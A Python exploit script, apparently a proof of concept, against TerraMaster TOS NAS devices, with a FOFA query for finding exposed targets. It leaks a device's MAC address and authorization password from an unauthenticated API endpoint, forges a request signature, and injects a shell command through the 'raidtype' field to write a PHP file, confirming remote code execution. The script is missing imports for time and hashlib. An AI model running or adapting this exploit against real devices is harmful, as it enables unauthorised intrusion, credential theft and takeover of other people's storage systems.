# !/usr/bin/env python3
# _*_ coding:utf-8 _*_

import re
import sys
import argparse
import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print('+          FOFA: "TerraMaster" && header="TOS"')

    
def run_proto(url):
    check_url = url + '/module/api.php?mobile/webNasIPS'
    headers = {
        'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
        'User-Agent': 'TNAS'
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=check_url, headers=headers,  verify=False, timeout=(3, 3), allow_redirects=False)
        if 'webNasIPS successful' in response.text and response.status_code == 200:
            print(check_url + '\tExist')
            # print(response.text)
            if poc_execute(response.text, url):
                req3 = requests.get(url=url + '/module/vuln1.php', headers=headers, verify=False, timeout=(3, 3), allow_redirects=False)
                print(req3.text)
                return True
            else:
                return False
        else:
            print('1')
            return False
    except Exception as e:
        # print(e)
        return False


def poc_execute(req,target):
    print("[+]开始进行命令执行检测---")
    mac = str(re.findall(r"ADDR:(.*?)\\", str(req))[0][-6:])
    # print('mac = {}'.format(mac))
    authorization = re.findall(r"PWD:(.*?)\\", req, re.M)[0]
    # print('authorization = {}'.format(authorization))
    timestamp = str(int(time.time()))
    signature = hashlib.md5((mac + timestamp).encode("utf-8")).hexdigest()
    data = {"raidtype": ';echo "<?php phpinfo();?>">vuln1.php', "diskstring": "XXXX"}
    headers = {"Authorization": authorization, "Signature": signature, "Timestamp": timestamp, "User-Agent": "TNAS"}
    payload = target + '/module/api.php?mobile/createRaid'
    # print('payload = {}'.format(payload))
    try:
        req2 = requests.post(url=payload, headers=headers, data=data, verify=False, timeout=(6, 6), allow_redirects=False)
        print(req2.text)
        if "successful" in req2.text:
            print("[+]命令执行成功，成功写入phpinfo文件，文件地址：{}".format(target+'/module/vuln1.php'))
            return True
        else:
            print('[+]命令执行失败')
            return False
    except Exception as e:
        print(e)
        print('[+]命令执行失败')
        return False


def run(target):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}'.format(proto[i], target)
        if run_proto(url):
            return True
        else:
            i = i + 1

if __name__ == '__main__':
    title()
    target = sys.argv[1]
    result = run(target)

    if result:
        print('Exist')
    else:
        print('UnExist')

